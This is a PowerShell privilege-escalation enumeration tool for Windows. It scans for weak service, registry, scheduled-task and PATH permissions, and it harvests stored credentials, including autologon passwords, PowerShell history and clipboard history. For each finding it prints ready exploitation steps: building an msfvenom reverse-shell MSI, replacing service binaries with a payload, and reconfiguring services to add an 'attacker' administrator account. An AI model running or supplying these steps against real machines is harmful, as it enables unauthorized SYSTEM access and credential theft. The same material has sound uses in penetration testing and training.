# ==============================================================================
# WINDOWS PRIVILEGE ESCALATION ANALYZER
# https://github.com/kkerst
#
# Use: Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
# if you can't run the script.
# ==============================================================================

function Show-Menu {
    Clear-Host
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "          PRIVILEGE ESCALATION ANALYZER           " -ForegroundColor Cyan
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "1. Audit Token Privileges (whoami /priv)"
    Write-Host "2. Audit Service Paths (Unquoted Paths)"
    Write-Host "3. Audit Registry (AlwaysInstallElevated)"
    Write-Host "4. Audit Modifiable Service Binaries (Weak File Perms)"
    Write-Host "5. Audit Modifiable Service Configs (Weak Service Perms)"
    Write-Host "6. Audit Scheduled Tasks (Weak Task/Script Perms)"
    Write-Host "7. Audit Cleartext Passwords & History Logs"
    Write-Host "8. Audit System %PATH% (DLL/Binary Hijacking)"
    Write-Host "9. Audit UAC Status & Integrity Levels"
    Write-Host "10. Audit Missing Hotfixes (Basic Patch Check)"
    Write-Host "11. Audit Custom Root Folders (C:\ Software)"
    Write-Host "12. Audit Active Clipboard Data & History"               # Inserted Line
    Write-Host "13. Run All Audits"                                        # Shifted Number
    Write-Host "0. Exit"
    Write-Host "==================================================" -ForegroundColor Cyan
}

function Audit-Privileges {
    Write-Host "`n[*] Auditing Token Privileges..." -ForegroundColor Yellow
    $privs = whoami /priv
    $found = $false

    $targetPrivs = @{
        "SeImpersonatePrivilege" = "JuicyPotatoNG, PrintSpoofer, or GodPotato depending on the OS version.";
        "SeAssignPrimaryTokenPrivilege" = "JuicyPotato or similar token abuse frameworks.";
        "SeBackupPrivilege" = "Copying the SAM/SYSTEM registry hives to dump local administrator hashes.";
        "SeTakeOwnershipPrivilege" = "Taking ownership of a service executable or system file to replace it."
    }

    foreach ($priv in $targetPrivs.Keys) {
        if ($privs -match $priv) {
            Write-Host "[!] ALERT: Found $priv Enabled/Available!" -ForegroundColor Red
            Write-Host "    --> How to exploit: Use $($targetPrivs[$priv])" -ForegroundColor White
            $found = $true
        }
    }

    if (-not $found) { Write-Host "[+] No high-risk exploit tokens found immediately available." -ForegroundColor Green }
}

function Audit-Services {
    Write-Host "`n[*] Auditing Services for Unquoted Paths..." -ForegroundColor Yellow
    
    # Query all local services that have spaces in the path but lack wrapping quotes
    $vulnServices = Get-CimInstance Win32_Service | Where-Object {
        $_.PathName -notlike '"*' -and 
        $_.PathName -like '* *' -and 
        $_.PathName -notlike '*\System32\*'
    }

    if ($vulnServices) {
        foreach ($service in $vulnServices) {
            Write-Host "[!] ALERT: Unquoted Service Path found in service: $($service.Name)" -ForegroundColor Red
            Write-Host "    Original Path: $($service.PathName)" -ForegroundColor Gray
            
            $rawPath = $service.PathName
            # Standard cleaning logic to isolate the executable path from trailing arguments
            if ($rawPath -match '^([^,]+\.exe)') { $rawPath = $Matches[1] }
            if ($rawPath -match '^"([^"]+)"') { $rawPath = $Matches[1] } 

            $elements = $rawPath -split '\\'
            $currentPath = $elements[0] 
            $exploitableFolders = @()

            # Walk through the path sections to check for write permissions at the interception points
            for ($i = 1; $i -lt $elements.Count; $i++) {
                if ($elements[$i] -match ' ') {
                    $payloadName = ($elements[$i] -split ' ')[0] + ".exe"
                    
                    if (Test-Path $currentPath) {
                        $icaclsOutput = icacls $currentPath 2>$null
                        $vulnPatterns = 'BUILTIN\\Users:.*\(F\)|BUILTIN\\Users:.*\(M\)|BUILTIN\\Users:.*\(W\)|Everyone:.*\(F\)|Everyone:.*\(M\)|Everyone:.*\(W\)|Authenticated Users:.*\(F\)|Authenticated Users:.*\(M\)|Authenticated Users:.*\(W\)'
                        
                        if ($icaclsOutput -match $vulnPatterns) {
                            $exploitableFolders += [PSCustomObject]@{
                                Folder      = $currentPath
                                PayloadName = $payloadName
                            }
                        }
                    }
                }
                $currentPath = "$currentPath\$($elements[$i])"
            }

            if ($exploitableFolders.Count -gt 0) {
                Write-Host "    Status: [VULNERABLE & HIGHLY EXPLOITABLE]" -ForegroundColor Red
                
                # INJECTED REMINDER BLOCK
                Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
                foreach ($target in $exploitableFolders) {
                    Write-Host "        [+] Write access confirmed in: $($target.Folder)" -ForegroundColor Green
                    Write-Host "            -> Drop your custom payload named: $($target.PayloadName)" -ForegroundColor DarkYellow
                }
                Write-Host "        [+] Force service restart to trigger execution:" -ForegroundColor Gray
                Write-Host "            sc stop $($service.Name) && sc start $($service.Name)" -ForegroundColor DarkYellow
            } else {
                $parentDir = Split-Path $rawPath -Parent
                Write-Host "    Status: [POTENTIAL - WRITE PERMS REJECTED OR MANUAL CHECK REQUIRED]" -ForegroundColor DarkYellow
                Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
                Write-Host "        - No broad user write permissions were detected automatically on the main intersections." -ForegroundColor Gray
                Write-Host "        - Double check permissions manually on the main parent folder just in case:" -ForegroundColor Gray
                Write-Host "          icacls `"$parentDir`"" -ForegroundColor DarkYellow
            }
            Write-Host "--------------------------------------------------" -ForegroundColor Gray
        }
    } else {
        Write-Host "[+] No unquoted service paths detected." -ForegroundColor Green
    }
}

function Audit-Registry {
    Write-Host "`n[*] Auditing Registry for AlwaysInstallElevated..." -ForegroundColor Yellow
    
    $hkcu = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $hklm = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated

    if ($hkcu -eq 1 -and $hklm -eq 1) {
        Write-Host "[!] ALERT: AlwaysInstallElevated is ENABLED!" -ForegroundColor Red
        Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
        Write-Host "        1. Generate a malicious MSI payload on your attacking machine:" -ForegroundColor Gray
        Write-Host "           msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o setup.msi" -ForegroundColor DarkYellow
        Write-Host "        2. Execute the installer silently on the target to trigger a SYSTEM shell:" -ForegroundColor Gray
        Write-Host "           msiexec /quiet /qn /i setup.msi" -ForegroundColor DarkYellow
    } else {
        Write-Host "[+] AlwaysInstallElevated is secure or not completely configured." -ForegroundColor Green
    }
}

function Audit-Binaries {
    Write-Host "`n[*] Auditing Service Binaries for Weak File Permissions..." -ForegroundColor Yellow
    $services = Get-CimInstance Win32_Service
    $foundVuln = $false

    foreach ($service in $services) {
        $rawPath = $service.PathName
        if (-not $rawPath) { continue }

        if ($rawPath -match '^"([^"]+)"') { 
            $cleanPath = $Matches[1] 
        } elseif ($rawPath -match '^([^ ]+\.exe)') { 
            $cleanPath = $Matches[1] 
        } else { 
            $cleanPath = $rawPath 
        }

        if ($cleanPath -like "*\System32\*" -or $cleanPath -like "*\SysWOW64\*") { continue }

        if (Test-Path $cleanPath) {
            $icaclsOutput = icacls "$cleanPath" 2>$null
            $vulnPatterns = 'BUILTIN\\Users:.*\(F\)|BUILTIN\\Users:.*\(M\)|Everyone:.*\(F\)|Everyone:.*\(M\)|Authenticated Users:.*\(F\)|Authenticated Users:.*\(M\)'
            
            if ($icaclsOutput -match $vulnPatterns) {
                $foundVuln = $true
                Write-Host "[!] ALERT: Weak File Permissions on Service Binary!" -ForegroundColor Red
                Write-Host "    Service Name: $($service.Name)" -ForegroundColor White
                Write-Host "    Binary Path:  $cleanPath" -ForegroundColor Gray
                Write-Host "    Status:       [VULNERABLE & HIGHLY EXPLOITABLE]" -ForegroundColor Red
                
                # INJECTED REMINDER BLOCK
                Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
                Write-Host "        1. Backup the original service executable file:" -ForegroundColor Gray
                Write-Host "           move `"$cleanPath`" `"$cleanPath.bak`"" -ForegroundColor DarkYellow
                Write-Host "        2. Drop your compiled reverse shell payload directly into that exact location:" -ForegroundColor Gray
                Write-Host "           copy payload.exe `"$cleanPath`"" -ForegroundColor DarkYellow
                Write-Host "        3. Restart the service to force execution of your file:" -ForegroundColor Gray
                Write-Host "           sc stop $($service.Name) && sc start $($service.Name)" -ForegroundColor DarkYellow
                Write-Host "--------------------------------------------------" -ForegroundColor Gray
            }
        }
    }

    if (-not $foundVuln) {
        Write-Host "[+] All analyzed service binaries have secure file permissions." -ForegroundColor Green
    }
}

function Audit-Configs {
    Write-Host "`n[*] Auditing Service Configurations for Weak Permissions..." -ForegroundColor Yellow
    $servicesPath = "HKLM:\SYSTEM\CurrentControlSet\Services"
    $services = Get-ChildItem -Path $servicesPath
    $foundVuln = $false

    $targetGroups = @("BUILTIN\Users", "Everyone", "NT AUTHORITY\Authenticated Users")
    $vulnRights = @("SetValue", "ChangePermissions", "FullControl")

    foreach ($service in $services) {
        $serviceName = $service.PSChildName
        if ($serviceName -match "^wuauserv|^TrustedInstaller|^Winmgmt|^RpcSsm") { continue }

        try {
            $acl = Get-Acl -Path $service.PSPath -ErrorAction SilentlyContinue
            if (-not $acl) { continue }

            foreach ($accessRule in $acl.Access) {
                $identity = $accessRule.IdentityReference.Value
                $rights = $accessRule.RegistryRights.ToString()

                if ($targetGroups -contains $identity) {
                    foreach ($right in $vulnRights) {
                        if ($rights -match $right) {
                            $foundVuln = $true
                            Write-Host "[!] ALERT: Weak Configuration Permissions on Service!" -ForegroundColor Red
                            Write-Host "    Service Name: $serviceName" -ForegroundColor White
                            Write-Host "    Group:        $identity" -ForegroundColor Gray
                            Write-Host "    Granted Right: $rights" -ForegroundColor Gray
                            Write-Host "    Status:       [VULNERABLE & HIGHLY EXPLOITABLE]" -ForegroundColor Red
                            
                            # INJECTED REMINDER BLOCK
                            Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
                            Write-Host "        1. Check current service settings to verify binpath visibility:" -ForegroundColor Gray
                            Write-Host "           sc qc $serviceName" -ForegroundColor DarkYellow
                            Write-Host "        2. Reconfigure the binary path string to execute a command as SYSTEM:" -ForegroundColor Gray
                            Write-Host "           sc config $serviceName binpath= `"net user attacker Pass123! /add`"" -ForegroundColor DarkYellow
                            Write-Host "           sc config $serviceName binpath= `"net localgroup administrators attacker /add`"" -ForegroundColor DarkYellow
                            Write-Host "        3. Bounce the service state to process the payload:" -ForegroundColor Gray
                            Write-Host "           sc stop $serviceName && sc start $serviceName" -ForegroundColor DarkYellow
                            Write-Host "--------------------------------------------------" -ForegroundColor Gray
                            break
                        }
                    }
                }
            }
        } catch { continue }
    }

    if (-not $foundVuln) {
        Write-Host "[+] All analyzed service configurations are securely restricted." -ForegroundColor Green
    }
}

function Audit-Tasks {
    Write-Host "`n[*] Auditing Scheduled Tasks for Weak Permissions..." -ForegroundColor Yellow
    $foundVuln = $false

    # Fetch tasks using native ScheduledTasks module
    try {
        $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.Principal.RunLevel -eq "Highest" -or $_.Principal.UserId -eq "SYSTEM" }
    } catch {
        Write-Host "[-] Failed to query scheduled tasks via cmdlets." -ForegroundColor Red
        return
    }

    foreach ($task in $tasks) {
        $action = $task.Actions | Where-Object { $_.Execute } | Select-Object -First 1
        if (-not $action) { continue }

        $rawPath = $action.Execute
        # Basic parsing to clean up strings wrapping arguments or quotes
        if ($rawPath -match '^"([^"]+)"') { $cleanPath = $Matches[1] } else { $cleanPath = $rawPath.Split(' ')[0] }

        # Filter out native Windows system tasks to eliminate background noise
        if ($cleanPath -like "*\System32\*" -or $cleanPath -like "*\Windows\System\*") { continue }

        if (Test-Path $cleanPath) {
            $icaclsOutput = icacls "$cleanPath" 2>$null
            $vulnPatterns = 'BUILTIN\\Users:.*\(F\)|BUILTIN\\Users:.*\(M\)|Everyone:.*\(F\)|Everyone:.*\(M\)'

            if ($icaclsOutput -match $vulnPatterns) {
                $foundVuln = $true
                Write-Host "[!] ALERT: Writeable Binary found on High-Privilege Scheduled Task!" -ForegroundColor Red
                Write-Host "    Task Name:   $($task.TaskName)" -ForegroundColor White
                Write-Host "    Target Path: $cleanPath" -ForegroundColor Gray
                Write-Host "    Status:      [VULNERABLE & HIGHLY EXPLOITABLE]" -ForegroundColor Red
                Write-Host "    --> How to exploit:" -ForegroundColor White
                Write-Host "        1. Replace or modify the file at: `"$cleanPath`"" -ForegroundColor DarkYellow
                Write-Host "        2. Force run if permissions permit: schtasks /run /tn `"$($task.TaskPath)$($task.TaskName)`"" -ForegroundColor DarkYellow
                Write-Host "--------------------------------------------------" -ForegroundColor Gray
            }
        }
    }

    if (-not $foundVuln) {
        Write-Host "[+] All analyzed scheduled task files have secure permissions." -ForegroundColor Green
    }
}

function Audit-Passwords {
    Write-Host "`n[*] Hunting for Cleartext Passwords and Config Artifacts..." -ForegroundColor Yellow
    $foundCreds = $false

    $targetFiles = @(
        "C:\Windows\Panther\Unattend.xml",
        "C:\Windows\Panther\Unattended.xml",
        "C:\Windows\System32\Sysprep\sysprep.xml"
    )

    foreach ($file in $targetFiles) {
        if (Test-Path $file) {
            $foundCreds = $true
            Write-Host "[!] ALERT: Found Deployment/Unattend File!" -ForegroundColor Red
            Write-Host "    Path: $file" -ForegroundColor White
            Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
            Write-Host "        - Open and search for plain text credentials or Base64 strings:" -ForegroundColor Gray
            Write-Host "          type `"$file`" | findstr /i `"password admin user cred`"" -ForegroundColor DarkYellow
        }
    }

    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        $foundCreds = $true
        Write-Host "[!] ALERT: PowerShell History Log Found!" -ForegroundColor Red
        Write-Host "    Path: $historyPath" -ForegroundColor White
        
        $keywords = "password|pass|net use|runas|securestring|credential"
        $matches = Select-String -Path $historyPath -Pattern $keywords
        
        if ($matches) {
            Write-Host "    [!] High-Value matching string patterns found in log lines:" -ForegroundColor Red
            
            $hasADS = $false
            foreach ($match in $matches | Select-Object -First 10) {
                $lineText = $match.Line.Trim()
                Write-Host "        -> Line $($match.LineNumber): $lineText" -ForegroundColor DarkYellow
                
                # Check if the line likely contains an Alternate Data Stream reference (e.g., file.txt:script.ps1)
                if ($lineText -match '\w+\.\w+:\w+\.(ps1|bat|exe|vbs|txt)') {
                    $hasADS = $true
                }
            }

            Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
            Write-Host "        - Read the entire history log manually to establish context or find hidden commands:" -ForegroundColor Gray
            Write-Host "          Get-Content `"$historyPath`"" -ForegroundColor DarkYellow
            
            # Dynamically inject the ADS extraction tip if a stream pattern was detected
            if ($hasADS) {
                Write-Host "        - [ADS DETECTED] Inspect hidden NTFS Alternate Data Streams:" -ForegroundColor Red
                Write-Host "          Get-Item -Path .\* -Stream *" -ForegroundColor DarkYellow
                Write-Host "          Get-Content -Path <BaseFile> -Stream <StreamName>" -ForegroundColor DarkYellow
            }
        } else {
            Write-Host "    [+] Log exists but no standard credential keywords triggered automatically." -ForegroundColor Green
        }
    }

    $winlogon = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
    if ($winlogon.DefaultPassword) {
        $foundCreds = $true
        Write-Host "[!] ALERT: Autologon Credentials Found in Registry!" -ForegroundColor Red
        Write-Host "    User: $($winlogon.DefaultUserName)" -ForegroundColor White
        Write-Host "    Pass: $($winlogon.DefaultPassword)" -ForegroundColor Green
        Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
        Write-Host "        - Test these credentials against local administrative groups or check for RunAs access:" -ForegroundColor Gray
        Write-Host "          runas /user:$($winlogon.DefaultUserName) cmd.exe" -ForegroundColor DarkYellow
    }

    if (-not $foundCreds) {
        Write-Host "[+] No immediate cleartext credential files or history logs flagged." -ForegroundColor Green
    }
}
	
function Audit-PathDirs {
    Write-Host "`n[*] Auditing System %PATH% Folders for Weak Permissions..." -ForegroundColor Yellow
    $foundVuln = $false

    # Grab environment paths and split them cleanly
    $envPaths = [Environment]::GetEnvironmentVariable("Path", "Machine") -split ';'
    
    foreach ($path in $envPaths) {
        if (-not $path -or -not (Test-Path $path)) { continue }

        # Skip protected core OS directories to reduce triage noise
        if ($path -like "*\System32*" -or $path -like "*\Windows*" -or $path -like "*\SysWOW64*") { continue }

        # Run text parsing on the folder permissions via icacls
        $icaclsOutput = icacls "$path" 2>$null
        $vulnPatterns = 'BUILTIN\\Users:.*\(F\)|BUILTIN\\Users:.*\(M\)|BUILTIN\\Users:.*\(W\)|Everyone:.*\(F\)|Everyone:.*\(M\)|Everyone:.*\(W\)'

        if ($icaclsOutput -match $vulnPatterns) {
            $foundVuln = $true
            Write-Host "[!] ALERT: Writeable Folder Found in System %PATH%!" -ForegroundColor Red
            Write-Host "    Directory: $path" -ForegroundColor White
            Write-Host "    Status:    [VULNERABLE & HIGHLY EXPLOITABLE]" -ForegroundColor Red
            Write-Host "    --> How to exploit:" -ForegroundColor White
            Write-Host "        1. Look for administrative tools or services that run commands out of context."
            Write-Host "        2. Plant a compiled binary or hijacked DLL directly inside: `"$path`"" -ForegroundColor DarkYellow
        }
    }

    if (-not $foundVuln) {
        Write-Host "[+] All analyzed %PATH% environment folders have secure configurations." -ForegroundColor Green
    }
}

function Audit-UAC {
    Write-Host "`n[*] Triage of User Account Control (UAC) & Integrity Status..." -ForegroundColor Yellow

    # Check current token group composition
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    $isAdminGroup = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    # Check process token integrity level
    $user = [Security.Principal.WindowsIdentity]::GetCurrent()
    $isHighIntegrity = $false
    foreach ($group in $user.Groups) {
        if ($group.Value -eq "S-1-16-12288" -or $group.Value -eq "S-1-16-16384") {
            $isHighIntegrity = $true
        }
    }

    # Query key UAC configurations out of the local machine registry hive
    $uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    $consentPrompt = (Get-ItemProperty -Path $uacKey -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin
    $enableLUA = (Get-ItemProperty -Path $uacKey -Name "EnableLUA" -ErrorAction SilentlyContinue).EnableLUA

    Write-Host "    Current Group Context: " -NoNewline
    if ($isAdminGroup) { Write-Host "Local Administrator Group Member" -ForegroundColor Cyan } else { Write-Host "Standard User Context" -ForegroundColor Gray }

    Write-Host "    Token Integrity Level: " -NoNewline
    if ($isHighIntegrity) { Write-Host "High/System (Elevated)" -ForegroundColor Green } else { Write-Host "Medium/Low (Restricted Token)" -ForegroundColor Yellow }

    # Map out exploit paths if they exist
    if ($isAdminGroup -and -not $isHighIntegrity) {
        if ($enableLUA -eq 1 -and ($consentPrompt -eq 5 -or $consentPrompt -eq 2 -or $consentPrompt -eq 0)) {
            Write-Host "[!] ALERT: Split-Token Admin Context Detected! UAC Bypass Feasible." -ForegroundColor Red
            Write-Host "    Status:       [VULNERABLE & HIGHLY EXPLOITABLE]" -ForegroundColor Red
            Write-Host "    --> How to exploit:" -ForegroundColor White
            Write-Host "        - Since you belong to the Local Administrators group but hold a Medium integrity token," -ForegroundColor DarkYellow
            Write-Host "          you can trigger a native UAC bypass bypass technique (e.g., abusing fodhelper.exe or computerdefaults.exe)." -ForegroundColor DarkYellow
            Write-Host "        - Execute an automated exploit wrapper or manual registry manipulation to spawn a High-Integrity shell." -ForegroundColor DarkYellow
        }
    } else {
        Write-Host "[+] Standard token configuration or already operating within fully elevated context." -ForegroundColor Green
    }
}

function Audit-Hotfixes {
    Write-Host "`n[*] Auditing Operating System Build and Installed Hotfixes..." -ForegroundColor Yellow
    
    $osInfo = Get-CimInstance Win32_OperatingSystem
    Write-Host "    OS Caption:    $($osInfo.Caption)" -ForegroundColor Gray
    Write-Host "    Build Version: $($osInfo.Version)" -ForegroundColor Gray

    Write-Host "    Querying hotfixes (this might take a second)..." -ForegroundColor Gray
    $patches = Get-HotFix -ErrorAction SilentlyContinue

    if (-not $patches) {
        Write-Host "[!] ALERT: No system hotfixes were returned by the operating system query!" -ForegroundColor Red
        Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
        Write-Host "        - This build lacks clear patch history. Cross-reference Build Version ($($osInfo.Version)) against local kernel exploits." -ForegroundColor Gray
        Write-Host "        - Common older targets to check manually: PrintNightmare (CVE-2021-1675), SeriousSam (CVE-2021-36934)" -ForegroundColor DarkYellow
    } else {
        Write-Host "[+] Found $($patches.Count) registered security updates/hotfixes on disk." -ForegroundColor Green
        Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
        Write-Host "        - If services or file permissions are completely secure, paste this Build Version ($($osInfo.Version))" -ForegroundColor Gray
        Write-Host "          directly into Google or Searchsploit alongside the word 'Privilege Escalation'." -ForegroundColor Gray
    }
}

function Audit-CustomFolders {
    Write-Host "`n[*] Scanning C:\ Root for Non-Standard/Writeable Directories..." -ForegroundColor Yellow
    $foundCustom = $false
    
    $defaultDirs = @("Windows", "Program Files", "Program Files (x86)", "Users", "ProgramData", "PerfLogs", "`$Recycle.Bin", "System Volume Information", "Recovery")
    $rootDirs = Get-ChildItem -Path "C:\" -Directory

    foreach ($dir in $rootDirs) {
        if ($defaultDirs -contains $dir.Name) { continue }
        
        $foundCustom = $true
        $icaclsOutput = icacls $dir.FullName 2>$null
        $vulnPatterns = 'BUILTIN\\Users:.*\(F\)|BUILTIN\\Users:.*\(M\)|BUILTIN\\Users:.*\(W\)|Everyone:.*\(F\)|Everyone:.*\(M\)|Everyone:.*\(W\)'

        Write-Host "[+] Non-Standard Directory: $($dir.FullName)" -ForegroundColor White
        if ($icaclsOutput -match $vulnPatterns) {
            Write-Host "    [!] ALERT: Folder has loose permissions writeable by standard users!" -ForegroundColor Red
            Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
            Write-Host "        - Search this custom folder layout for administrative scripts, configurations, or writeable .exe files." -ForegroundColor Gray
            Write-Host "        - To recursively check for writeable executables inside this folder, run:" -ForegroundColor Gray
            Write-Host "          Get-ChildItem -Path `"$($dir.FullName)`" -Recurse -Include *.exe,*.bat,*.ps1,*.vbs | Get-Acl | Select-Object AccessToString" -ForegroundColor DarkYellow
        } else {
            Write-Host "    [-] Permissions are restricted securely for standard groups." -ForegroundColor Green
        }
    }

    if (-not $foundCustom) {
        Write-Host "[+] No non-standard root folders discovered on the C:\ drive." -ForegroundColor Green
    }
}

# 12. CLIPBOARD & HISTORY AUDIT
function Audit-Clipboard {
    Write-Host "`n[*] Inspecting Active Clipboard Buffers..." -ForegroundColor Yellow

    # 1. Grab current volatile RAM item
    try {
        $currentClip = Get-Clipboard -Raw -ErrorAction SilentlyContinue
        if ($currentClip) {
            Write-Host "[!] ALERT: Found Data Currently Inside Volatile Clipboard!" -ForegroundColor Red
            Write-Host "    ---> Content Snippet:" -ForegroundColor White
            Write-Host "         $($currentClip.Trim())" -ForegroundColor DarkYellow
        } else {
            Write-Host "[+] Active volatile clipboard RAM buffer is currently empty." -ForegroundColor Green
        }
    } catch {
        Write-Host "[-] Failed to read active clipboard RAM." -ForegroundColor Red
    }

    # 2. Check if advanced 25-item rolling history registry is active
    Write-Host "`n[*] Checking Clipboard History Feature Configuration..." -ForegroundColor Yellow
    $historyRegistryPath = "HKCU:\Software\Microsoft\Clipboard"
    $historyEnabled = 0
    
    if (Test-Path $historyRegistryPath) {
        $historyEnabled = (Get-ItemProperty -Path $historyRegistryPath -Name "EnableClipboardHistory" -ErrorAction SilentlyContinue).EnableClipboardHistory
    }

    if ($historyEnabled -eq 1) {
        Write-Host "[!] STATUS: Advanced Clipboard History (Win + V) is ENABLED on target!" -ForegroundColor Red
        Write-Host "[*] Extracting historical item entries from the Windows Runtime API..." -ForegroundColor Yellow

        try {
            # Load WinRT Core types natively to access the history buffer asynchronously
            $clipboardType = [Windows.ApplicationModel.DataTransfer.Clipboard, Windows.ApplicationModel.DataTransfer, ContentType=WindowsRuntime]
            $asyncOp = $clipboardType::GetHistoryItemsAsync()
            
            # Wait for the async task tracking structure to finish processing
            while ($asyncOp.Status -eq "Started") { Start-Sleep -Milliseconds 50 }
            $historyResult = $asyncOp.GetResults()

            if ($historyResult.Items.Count -gt 0) {
                Write-Host "[!] SUCCESS: Retrieved $($historyResult.Items.Count) historical items from cache!" -ForegroundColor Green
                Write-Host "    --> REMINDER / NEXT STEPS:" -ForegroundColor Cyan
                Write-Host "        - Review items below carefully for passwords, keys, or internal target configurations." -ForegroundColor Gray
                Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray

                $index = 1
                foreach ($item in $historyResult.Items) {
                    # Query the content within each entry container specifically for standard Text formatting
                    if ($item.Content.Contains([Windows.ApplicationModel.DataTransfer.StandardDataFormats]::Text)) {
                        $textOp = $item.Content.GetTextAsync()
                        while ($textOp.Status -eq "Started") { Start-Sleep -Milliseconds 20 }
                        $itemText = $textOp.GetResults()

                        if ($itemText) {
                            Write-Host "   [Entry #$index] (Timestamp: $($item.Timestamp.DateTime))" -ForegroundColor Cyan
                            Write-Host "   $($itemText.Trim())" -ForegroundColor White
                            Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
                            $index++
                        }
                    }
                }
            } else {
                Write-Host "[+] History tracking is active, but the 25-item cache is currently empty." -ForegroundColor Green
            }
        } catch {
            Write-Host "[-] Error extracting history. (Context requires interactive execution session types)." -ForegroundColor Gray
        }
    } else {
        Write-Host "[-] Advanced Clipboard History feature is disabled or not configured for this user profile." -ForegroundColor Gray
    }
}

# ==============================================================================
#                                MAIN MENU LOOP 
# ==============================================================================
do {
    Show-Menu
    $choice = Read-Host "Select an option [0-13]"
    switch ($choice) {
        "1" { Audit-Privileges; Pause }
        "2" { Audit-Services; Pause }
        "3" { Audit-Registry; Pause }
        "4" { Audit-Binaries; Pause }
        "5" { Audit-Configs; Pause }
        "6" { Audit-Tasks; Pause }
        "7" { Audit-Passwords; Pause }
        "8" { Audit-PathDirs; Pause }
        "9" { Audit-UAC; Pause }
        "10" { Audit-Hotfixes; Pause }
        "11" { Audit-CustomFolders; Pause }
        "12" { Audit-Clipboard; Pause }                              
        "13" {                                                         
            Audit-Privileges; Audit-Services; Audit-Registry; Audit-Binaries; 
            Audit-Configs; Audit-Tasks; Audit-Passwords; Audit-PathDirs; 
            Audit-UAC; Audit-Hotfixes; Audit-CustomFolders; Audit-Clipboard; Pause 
        }
        "0" { Write-Host "Exiting..." -ForegroundColor Cyan; exit }
        default { Write-Host "Invalid option, try again." -ForegroundColor Red; Start-Sleep -Seconds 1 }
    }
} while ($true)